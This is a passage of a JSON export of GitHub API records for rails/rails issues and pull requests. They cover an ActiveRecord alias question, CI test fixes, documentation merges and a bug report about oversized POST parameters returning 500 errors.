        "body": "We are trying to do something like this:\r\n\r\n```\r\n  has_many :source_tracks\r\n  alias_method :source_objects, :source_tracks\r\n  has_many :source_object_genres, through: :source_objects\r\n```\r\n\r\nHowever it seems like ActiveRecord does not recognize the alias_method for source_objects:\r\n\r\n```\r\nActiveRecord::HasManyThroughAssociationNotFoundError: Could not find the association :source_objects\r\n```\r\n\r\n Is that something that could get added?\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n**Ruby version**: 3.2.1\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51062/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51062/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51061",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51061/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51061/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51061/events",
        "html_url": "https://github.com/rails/rails/pull/51061",
        "id": 2132217599,
        "node_id": "PR_kwDNIULOZr8qwQ",
        "number": 51061,
        "title": "Backport #50606 to 7-1-stable",
        "user": {
            "login": "maximerety",
            "id": 58582,
            "node_id": "MDQ6VXNlcjU4NTgy",
            "avatar_url": "https://avatars.githubusercontent.com/u/58582?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/maximerety",
            "html_url": "https://github.com/maximerety",
            "followers_url": "https://api.github.com/users/maximerety/followers",
            "following_url": "https://api.github.com/users/maximerety/following{/other_user}",
            "gists_url": "https://api.github.com/users/maximerety/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/maximerety/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/maximerety/subscriptions",
            "organizations_url": "https://api.github.com/users/maximerety/orgs",
            "repos_url": "https://api.github.com/users/maximerety/repos",
            "events_url": "https://api.github.com/users/maximerety/events{/privacy}",
            "received_events_url": "https://api.github.com/users/maximerety/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107188,
                "node_id": "MDU6TGFiZWwxMDcxODg=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailer",
                "name": "actionmailer",
                "color": "8B00FC",
                "default": false,
                "description": null
            },
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            },
            {
                "id": 1174770998,
                "node_id": "MDU6TGFiZWwxMTc0NzcwOTk4",
                "url": "https://api.github.com/repos/rails/rails/labels/actionmailbox",
                "name": "actionmailbox",
                "color": "f4a6cb",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-13T12:28:27Z",
        "updated_at": "2024-02-14T08:44:50Z",
        "closed_at": "2024-02-13T23:06:09Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51061",
            "html_url": "https://github.com/rails/rails/pull/51061",
            "diff_url": "https://github.com/rails/rails/pull/51061.diff",
            "patch_url": "https://github.com/rails/rails/pull/51061.patch",
            "merged_at": "2024-02-13T23:06:09Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/50606\r\n\r\nOpening a PR because the patch didn't apply cleanly.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51061/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51061/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51060",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51060/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51060/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51060/events",
        "html_url": "https://github.com/rails/rails/pull/51060",
        "id": 2132195545,
        "node_id": "PR_kwDNIULOZr7cbA",
        "number": 51060,
        "title": "Address `ActiveStorage::VariantTest#test_resized_variation_of_WEBP_blob` failure at Rails Nightly CI",
        "user": {
            "login": "yahonda",
            "id": 73684,
            "node_id": "MDQ6VXNlcjczNjg0",
            "avatar_url": "https://avatars.githubusercontent.com/u/73684?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/yahonda",
            "html_url": "https://github.com/yahonda",
            "followers_url": "https://api.github.com/users/yahonda/followers",
            "following_url": "https://api.github.com/users/yahonda/following{/other_user}",
            "gists_url": "https://api.github.com/users/yahonda/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/yahonda/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/yahonda/subscriptions",
            "organizations_url": "https://api.github.com/users/yahonda/orgs",
            "repos_url": "https://api.github.com/users/yahonda/repos",
            "events_url": "https://api.github.com/users/yahonda/events{/privacy}",
            "received_events_url": "https://api.github.com/users/yahonda/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T12:15:37Z",
        "updated_at": "2024-02-13T12:29:46Z",
        "closed_at": "2024-02-13T12:29:46Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51060",
            "html_url": "https://github.com/rails/rails/pull/51060",
            "diff_url": "https://github.com/rails/rails/pull/51060.diff",
            "patch_url": "https://github.com/rails/rails/pull/51060.patch",
            "merged_at": "2024-02-13T12:29:46Z"
        },
        "body": "### Motivation / Background\r\n\r\nManaged to reproduce Rails Nightly CI failure\r\nat https://buildkite.com/rails/rails-nightly/builds/149#018d9052-1b2d-48fa-9d74-a39df3f3f1d6/1251-1291\r\n\r\nThis commit allows both 33 and 34 as its height because this issue is isolated that the difference comes from libvips and/or ruby-vips behavior differences, not Active Storage.\r\n\r\n### Detail\r\n- Steps to reproduce, Run this test on Ubuntu 22.04. It should not reproduce on Ubuntu 23.10.\r\n\r\n```ruby\r\ngit clone https://github.com/rails/rails\r\ncd rails\r\nrm Gemfile.lock\r\ncd activestorage\r\nbin/test test/models/variant_test.rb -n test_resized_variation_of_WEBP_blob\r\n```\r\n\r\n* Expected behavior It should pass.\r\n\r\n* Actual behavior It fails because the height of the thumbnail is 34.\r\n\r\n```ruby\r\n$ bin/test test/models/variant_test.rb -n test_resized_variation_of_WEBP_blob\r\nF\r\n\r\nFailure:\r\nActiveStorage::VariantTest#test_resized_variation_of_WEBP_blob [test/models/variant_test.rb:125]:\r\nExpected: 33\r\n  Actual: 34\r\n\r\nbin/test test/models/variant_test.rb:117\r\n```\r\n\r\n### Additional information\r\nRefer to https://github.com/libvips/ruby-vips/issues/383\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51060/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51060/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51059",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51059/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51059/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51059/events",
        "html_url": "https://github.com/rails/rails/pull/51059",
        "id": 2131693619,
        "node_id": "PR_kwDNIULOZrfvxA",
        "number": 51059,
        "title": "Add support join types in where.associated",
        "user": {
            "login": "saleh-alhaddad",
            "id": 60958871,
            "node_id": "MDQ6VXNlcjYwOTU4ODcx",
            "avatar_url": "https://avatars.githubusercontent.com/u/60958871?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/saleh-alhaddad",
            "html_url": "https://github.com/saleh-alhaddad",
            "followers_url": "https://api.github.com/users/saleh-alhaddad/followers",
            "following_url": "https://api.github.com/users/saleh-alhaddad/following{/other_user}",
            "gists_url": "https://api.github.com/users/saleh-alhaddad/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/saleh-alhaddad/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/saleh-alhaddad/subscriptions",
            "organizations_url": "https://api.github.com/users/saleh-alhaddad/orgs",
            "repos_url": "https://api.github.com/users/saleh-alhaddad/repos",
            "events_url": "https://api.github.com/users/saleh-alhaddad/events{/privacy}",
            "received_events_url": "https://api.github.com/users/saleh-alhaddad/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T08:09:47Z",
        "updated_at": "2024-02-22T04:47:21Z",
        "closed_at": "2024-02-13T18:11:28Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51059",
            "html_url": "https://github.com/rails/rails/pull/51059",
            "diff_url": "https://github.com/rails/rails/pull/51059.diff",
            "patch_url": "https://github.com/rails/rails/pull/51059.patch",
            "merged_at": null
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51059/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51059/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51058",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51058/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51058/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51058/events",
        "html_url": "https://github.com/rails/rails/pull/51058",
        "id": 2131647450,
        "node_id": "PR_kwDNIULOZrdJbg",
        "number": 51058,
        "title": "Merge pull request #51017 from p8/activesupport/document-time-zone-cr",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T07:46:48Z",
        "updated_at": "2024-02-13T07:47:30Z",
        "closed_at": "2024-02-13T07:47:27Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51058",
            "html_url": "https://github.com/rails/rails/pull/51058",
            "diff_url": "https://github.com/rails/rails/pull/51058.diff",
            "patch_url": "https://github.com/rails/rails/pull/51058.patch",
            "merged_at": "2024-02-13T07:47:27Z"
        },
        "body": "eate\r\n\r\nImprove documentation of ActiveSupport::TimeZone.create [ci-skip]",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51058/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51058/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51057",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51057/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51057/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51057/events",
        "html_url": "https://github.com/rails/rails/pull/51057",
        "id": 2131643878,
        "node_id": "PR_kwDNIULOZrc9Ew",
        "number": 51057,
        "title": "Merge pull request #50994 from p8/activerecord/document-alias-attribute",
        "user": {
            "login": "p8",
            "id": 28561,
            "node_id": "MDQ6VXNlcjI4NTYx",
            "avatar_url": "https://avatars.githubusercontent.com/u/28561?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/p8",
            "html_url": "https://github.com/p8",
            "followers_url": "https://api.github.com/users/p8/followers",
            "following_url": "https://api.github.com/users/p8/following{/other_user}",
            "gists_url": "https://api.github.com/users/p8/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/p8/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/p8/subscriptions",
            "organizations_url": "https://api.github.com/users/p8/orgs",
            "repos_url": "https://api.github.com/users/p8/repos",
            "events_url": "https://api.github.com/users/p8/events{/privacy}",
            "received_events_url": "https://api.github.com/users/p8/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T07:43:57Z",
        "updated_at": "2024-02-13T07:45:05Z",
        "closed_at": "2024-02-13T07:44:39Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51057",
            "html_url": "https://github.com/rails/rails/pull/51057",
            "diff_url": "https://github.com/rails/rails/pull/51057.diff",
            "patch_url": "https://github.com/rails/rails/pull/51057.patch",
            "merged_at": null
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51057/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51057/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51056",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51056/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51056/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51056/events",
        "html_url": "https://github.com/rails/rails/issues/51056",
        "id": 2131422677,
        "node_id": "I_kwDNIULOfwrt1Q",
        "number": 51056,
        "title": "Invalid route POST request results in key space error 500 instead of 404",
        "user": {
            "login": "valerauko",
            "id": 6322484,
            "node_id": "MDQ6VXNlcjYzMjI0ODQ=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6322484?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/valerauko",
            "html_url": "https://github.com/valerauko",
            "followers_url": "https://api.github.com/users/valerauko/followers",
            "following_url": "https://api.github.com/users/valerauko/following{/other_user}",
            "gists_url": "https://api.github.com/users/valerauko/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/valerauko/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/valerauko/subscriptions",
            "organizations_url": "https://api.github.com/users/valerauko/orgs",
            "repos_url": "https://api.github.com/users/valerauko/repos",
            "events_url": "https://api.github.com/users/valerauko/events{/privacy}",
            "received_events_url": "https://api.github.com/users/valerauko/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-13T04:04:10Z",
        "updated_at": "2024-02-18T18:59:58Z",
        "closed_at": "2024-02-18T18:59:58Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n\r\nIt is possible to craft a POST request that results in a \"exceeded available parameter key space\" error, even though the request is targeting a route that doesn't exist. We've seen this error occur in production (due to malicious requests), but we don't actually have such a crafted POST request at hand to reproduce.\r\n\r\n#### Config\r\n\r\nWe don't have Rack::Utils.key_space_limit configured, so it should be the default value.\r\n```\r\npry(main)> Rack::Utils.key_space_limit\r\n=> 65536\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\na 404 error is returned\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\nan 500 internal server error is returned\r\n\r\n```\r\nInvalid or incomplete POST params\r\nError during failsafe response: exceeded available parameter key space\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/query_parser.rb:175:in `[]='\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/query_parser.rb:103:in `normalize_params'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/query_parser.rb:75:in `block in parse_nested_query'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/query_parser.rb:72:in `each'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/query_parser.rb:72:in `parse_nested_query'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/request.rb:590:in `parse_query'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/request.rb:454:in `POST'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/request.rb:400:in `block (2 levels) in POST'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/parameters.rb:90:in `block in parse_formatted_parameters'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/parameters.rb:90:in `fetch'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/parameters.rb:90:in `parse_formatted_parameters'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/request.rb:399:in `block in POST'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/request.rb:69:in `fetch'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/request.rb:69:in `fetch_header'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/request.rb:398:in `POST'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/parameters.rb:55:in `parameters'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/mime_negotiation.rb:166:in `params_readable?'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/mime_negotiation.rb:71:in `block in formats'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/request.rb:69:in `fetch'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/request.rb:69:in `fetch_header'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/http/mime_negotiation.rb:70:in `formats'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/show_exceptions.rb:64:in `fallback_to_html_format_if_invalid_mime_type'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/show_exceptions.rb:50:in `render_exception'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/show_exceptions.rb:36:in `rescue in call'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/show_exceptions.rb:31:in `call'\r\n  /usr/local/bundle/gems/railties-6.1.7.6/lib/rails/rack/logger.rb:37:in `call_app'\r\n  /usr/local/bundle/gems/railties-6.1.7.6/lib/rails/rack/logger.rb:26:in `block in call'\r\n  /usr/local/bundle/gems/activesupport-6.1.7.6/lib/active_support/tagged_logging.rb:99:in `block in tagged'\r\n  /usr/local/bundle/gems/activesupport-6.1.7.6/lib/active_support/tagged_logging.rb:37:in `tagged'\r\n  /usr/local/bundle/gems/activesupport-6.1.7.6/lib/active_support/tagged_logging.rb:99:in `tagged'\r\n  /usr/local/bundle/gems/railties-6.1.7.6/lib/rails/rack/logger.rb:26:in `call'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/remote_ip.rb:81:in `call'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/request_id.rb:26:in `call'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/method_override.rb:24:in `call'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/runtime.rb:22:in `call'\r\n  /usr/local/bundle/gems/activesupport-6.1.7.6/lib/active_support/cache/strategy/local_cache_middleware.rb:29:in `call'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/executor.rb:14:in `call'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/static.rb:24:in `call'\r\n  /usr/local/bundle/gems/rack-2.2.8/lib/rack/sendfile.rb:110:in `call'\r\n  /usr/local/bundle/gems/actionpack-6.1.7.6/lib/action_dispatch/middleware/host_authorization.rb:142:in `call'\r\n  /usr/local/bundle/gems/ddtrace-1.12.1/lib/datadog/tracing/contrib/rack/middlewares.rb:98:in `call'\r\n  /usr/local/bundle/gems/railties-6.1.7.6/lib/rails/engine.rb:539:in `call'\r\n  /usr/local/bundle/gems/railties-6.1.7.6/lib/rails/railtie.rb:207:in `public_send'\r\n  /usr/local/bundle/gems/railties-6.1.7.6/lib/rails/railtie.rb:207:in `method_missing'\r\n  /usr/local/bundle/gems/unicorn-5.7.0/lib/unicorn/http_server.rb:632:in `process_client'\r\n  /usr/local/bundle/gems/unicorn-worker-killer-0.4.4/lib/unicorn/worker_killer.rb:92:in `process_client'\r\n  /usr/local/bundle/gems/unicorn-5.7.0/lib/unicorn/http_server.rb:728:in `worker_loop'\r\n  /usr/local/bundle/gems/unicorn-5.7.0/lib/unicorn/http_server.rb:548:in `spawn_missing_workers'\r\n  /usr/local/bundle/gems/unicorn-5.7.0/lib/unicorn/http_server.rb:562:in `maintain_worker_count'\r\n  /usr/local/bundle/gems/unicorn-5.7.0/lib/unicorn/http_server.rb:295:in `join'\r\n  /usr/local/bundle/gems/unicorn-5.7.0/bin/unicorn_rails:209:in `<top (required)>'\r\n  /usr/local/bundle/bin/unicorn_rails:25:in `load'\r\n  /usr/local/bundle/bin/unicorn_rails:25:in `<top (required)>'\r\n  /usr/local/lib/ruby/3.0.0/bundler/cli/exec.rb:58:in `load'\r\n  /usr/local/lib/ruby/3.0.0/bundler/cli/exec.rb:58:in `kernel_load'\r\n  /usr/local/lib/ruby/3.0.0/bundler/cli/exec.rb:23:in `run'\r\n  /usr/local/lib/ruby/3.0.0/bundler/cli.rb:478:in `exec'\r\n  /usr/local/lib/ruby/3.0.0/bundler/vendor/thor/lib/thor/command.rb:27:in `run'\r\n  /usr/local/lib/ruby/3.0.0/bundler/vendor/thor/lib/thor/invocation.rb:127:in `invoke_command'\r\n  /usr/local/lib/ruby/3.0.0/bundler/vendor/thor/lib/thor.rb:392:in `dispatch'\r\n  /usr/local/lib/ruby/3.0.0/bundler/cli.rb:31:in `dispatch'\r\n  /usr/local/lib/ruby/3.0.0/bundler/vendor/thor/lib/thor/base.rb:485:in `start'\r\n  /usr/local/lib/ruby/3.0.0/bundler/cli.rb:25:in `start'\r\n  /usr/local/lib/ruby/gems/3.0.0/gems/bundler-2.2.32/libexec/bundle:49:in `block in <top (required)>'\r\n  /usr/local/lib/ruby/3.0.0/bundler/friendly_errors.rb:103:in `with_friendly_errors'\r\n  /usr/local/lib/ruby/gems/3.0.0/gems/bundler-2.2.32/libexec/bundle:37:in `<top (required)>'\r\n  /usr/local/bin/bundle:23:in `load'\r\n  /usr/local/bin/bundle:23:in `<main>'\r\n```\r\n\r\nThis seems to be related to https://github.com/rails/rails/issues/29983\r\n\r\n### System configuration\r\n**Rails version**: 6.1.7.6\r\n\r\n**Ruby version**: 3.0.3\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51056/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51056/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51055",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51055/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51055/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51055/events",
        "html_url": "https://github.com/rails/rails/pull/51055",
        "id": 2131416678,
        "node_id": "PR_kwDNIULOZrQ-sQ",
        "number": 51055,
        "title": "Add preview_docs rake task for generating API and Guides static site",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-13T03:56:04Z",
        "updated_at": "2024-02-15T00:20:42Z",
        "closed_at": "2024-02-14T21:30:35Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51055",
            "html_url": "https://github.com/rails/rails/pull/51055",
            "diff_url": "https://github.com/rails/rails/pull/51055.diff",
            "patch_url": "https://github.com/rails/rails/pull/51055.patch",
            "merged_at": "2024-02-14T21:30:35Z"
        },
        "body": "[Example deploy](https://60ed10f7.zzak-rails.pages.dev/) made with rails/buildkite-config#89",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51055/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51055/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51054",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51054/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51054/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51054/events",
        "html_url": "https://github.com/rails/rails/pull/51054",
        "id": 2131334204,
